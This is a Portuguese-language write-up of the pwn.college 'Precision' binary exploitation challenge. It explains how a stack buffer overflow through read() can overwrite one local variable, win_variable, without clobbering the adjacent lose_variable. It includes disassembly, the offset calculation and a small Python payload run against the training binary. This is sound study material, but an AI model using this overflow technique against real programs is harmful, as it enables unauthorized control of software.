# pwn.college — Precision (Hard)
### Intro to Cybersecurity · Orange Belt · Binary Exploitation

> **Autor:** [seu nome/handle]  
> **Plataforma:** [pwn.college](https://pwn.college)  
> **Categoria:** Binary Exploitation — Intro to Cybersecurity (Orange Belt)  
> **Técnicas:** Stack buffer overflow · Sobrescrita precisa de variável local · Controle de fluxo sem tocar no return address

---

## Índice

1. [Visão Geral](#visão-geral)
2. [Análise do Binário](#análise-do-binário)
3. [Entendendo a Stack](#entendendo-a-stack)
4. [Encontrando as Variáveis Alvo](#encontrando-as-variáveis-alvo)
5. [Cálculo do Offset](#cálculo-do-offset)
6. [Payload Final](#payload-final)
7. [Execução e Flag](#execução-e-flag)
8. [Conclusão](#conclusão)

---

## Visão Geral

O desafio *Precision* apresenta uma variação menos comum do buffer overflow: em vez de sobrescrever o **return address** para redirecionar o fluxo de execução, o objetivo é sobrescrever **uma variável local específica** na stack — sem tocar em outra variável adjacente que causaria o crash do programa.

Isso exige não apenas encontrar o offset correto até a variável alvo, mas também entender o **layout exato da stack** para não ultrapassar os limites e sobrescrever a variável errada.

---

## Análise do Binário

O binário possui três funções principais:

| Função      | Papel                                              |
|-------------|----------------------------------------------------|
| `main`      | Inicializa e chama `challenge`                     |
| `challenge` | Lê o input do usuário — contém a vulnerabilidade   |
| `win`       | Imprime a flag — deve ser alcançada pelo exploit   |

### Leitura vulnerável

No disassembly de `challenge`, encontramos a chamada para `read`:

```asm
mov rdx, QWORD PTR [rbp-0x98]   ; tamanho: até 4096 bytes
lea rax, [rbp-0x90]              ; endereço do buffer
mov rsi, rax
call read
```

Equivalente em C:

```c
read(0, &buffer, size);  // buffer em [rbp-0x90], size até 4096
```

O buffer fica em `[rbp-0x90]` e aceita até **4096 bytes** — muito além do tamanho real do buffer, caracterizando um buffer overflow.

![Disassembly de challenge com read e verificação](figuras/precision-challenge.png)

---

## Entendendo a Stack

Em uma função, as variáveis locais são alocadas na stack em relação ao `rbp` (base pointer). O layout típico é:

```
endereço alto
┌──────────────────────┐
│   return address     │  ← [rbp + 0x8]
├──────────────────────┤
│   saved rbp          │  ← [rbp]
├──────────────────────┤
│   lose_variable      │  ← endereço próximo ao rbp
├──────────────────────┤
│   win_variable       │  ← [rbp-0x10]
├──────────────────────┤
│   ...                │
├──────────────────────┤
│   buffer             │  ← [rbp-0x90]  ← input começa aqui
└──────────────────────┘
endereço baixo
```

O overflow cresce de baixo para cima — ao escrever além do buffer, os bytes começam a sobrescrever as variáveis locais acima dele.

---

## Encontrando as Variáveis Alvo

No disassembly, identificamos um trecho que:

1. Carrega o valor de `[rbp-0x10]` em `rax`
2. Testa se `rax == 0`
3. Se for zero, **pula** a chamada para `win` — caso contrário, executa

Isso indica que `[rbp-0x10]` é a **`win_variable`**: precisa ser **diferente de zero** para o programa chamar `win`.

Existe também uma **`lose_variable`** em um offset próximo ao `rbp`. Se ela for sobrescrita, o programa detecta a condição de perda e encerra antes de entregar a flag.

---

## Cálculo do Offset

Com os endereços identificados pelo GDB:

```
buffer:        [rbp - 0x90]
win_variable:  [rbp - 0x10]
```

**Distância entre o início do buffer e a variável alvo:**

```
0x90 - 0x10 = 0x80 = 128 bytes
```

Ou seja:
- Os primeiros **128 bytes** do input preenchem o espaço até `win_variable`
- O **byte 129 em diante** sobrescreve `win_variable`

> ⚠️ **Limite crítico:** Qualquer byte além do necessário para sobrescrever `win_variable` pode atingir a `lose_variable` — o que faz o programa encerrar sem dar a flag. A sobrescrita precisa ser **cirúrgica**.

---

## Payload Final

A solução é escrever exatamente **128 bytes de padding** seguidos de pelo menos **1 byte diferente de zero** para sobrescrever `win_variable`:

```python
from pwn import *

payload = (
    b"A" * 128 +   # preenche o espaço até win_variable
    b"\x01"        # sobrescreve win_variable com valor != 0
)

open("payload", "wb").write(payload)
```

Execução:

```bash
/challenge/binary-exploitation-precision < payload
```

### Por que apenas 1 byte extra?

`win_variable` fica entre `[rbp-0x10]` e `lose_variable`. Escrever apenas 1 byte garante que apenas o primeiro byte de `win_variable` seja alterado — o suficiente para satisfazer a condição `!= 0` sem vazar para a variável adjacente.

---

## Execução e Flag

Com o payload correto, o programa passou pela verificação de `win_variable` e executou `win()`:

```
You win! Here is your flag:
pwn.college{...}
```

---

## Conclusão

*Precision* é um desafio que vai além do overflow clássico de return address: o objetivo é **escrever no lugar certo, na quantidade certa**. Isso exige um entendimento mais fino do layout da stack — não basta causar o overflow, é preciso controlar exatamente quais bytes são afetados.

Esse tipo de primitiva é especialmente relevante em cenários reais, onde um overflow pode ser usado para corromper variáveis de controle de fluxo (flags, contadores, ponteiros de função) sem necessariamente sobrescrever o return address — o que pode contornar proteções como stack canaries.

### Resumo técnico

| Elemento              | Valor / Técnica                              |
|-----------------------|----------------------------------------------|
| Vulnerabilidade       | Stack buffer overflow via `read`             |
| Objetivo              | Sobrescrever `win_variable` sem tocar em `lose_variable` |
| Buffer                | `[rbp-0x90]`                                 |
| Variável alvo         | `[rbp-0x10]`                                 |
| Offset até o alvo     | 128 bytes                                    |
| Payload               | `b"A" * 128 + b"\x01"`                       |
| Técnica               | Partial stack overwrite com precisão de byte |

---

*Feito como parte dos estudos em Binary Exploitation no pwn.college — Engenharia de Computação e Informação, UFRJ.*
